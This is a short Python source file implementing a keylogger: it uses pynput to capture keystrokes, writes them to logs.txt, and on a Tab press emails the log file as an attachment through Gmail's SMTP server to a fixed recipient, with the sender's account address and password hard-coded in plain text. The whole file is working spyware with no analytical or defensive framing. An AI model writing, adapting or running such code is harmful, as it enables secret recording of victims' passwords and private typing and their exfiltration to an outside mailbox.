import pynput, os, email, ssl, smtplib, atexit
from pynput.keyboard import Key, Listener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

presses = []
EmailAddress = "keylogs583@gmail.com"
EmailPassword = "*r650A1#X@VW"

message = MIMEMultipart()
message["From"] = EmailAddress
message["To"] = "nh6950@desales.edu"
message["Subject"] = "Key Logs"

def log_key(key):
    with open("logs.txt", "a") as f:
        word = ""
        word = word.join(str(presses))
        f.write(word)
        f.write(" ")
        presses.clear() #resetting presses

def on_press(key):
    if key == Key.space or key == Key.enter:
        log_key(key)
    elif key == Key.tab:
        sendEmail()
    else:
        presses.append(key)

def on_release(key):
    if key == Key.esc:
        return False

def sendEmail():
    filename = "logs.txt"
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    message.attach(part)
    text = message.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(EmailAddress, EmailPassword)
    server.sendmail(EmailAddress, "nh6950@desales.edu", text)
    server.quit()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

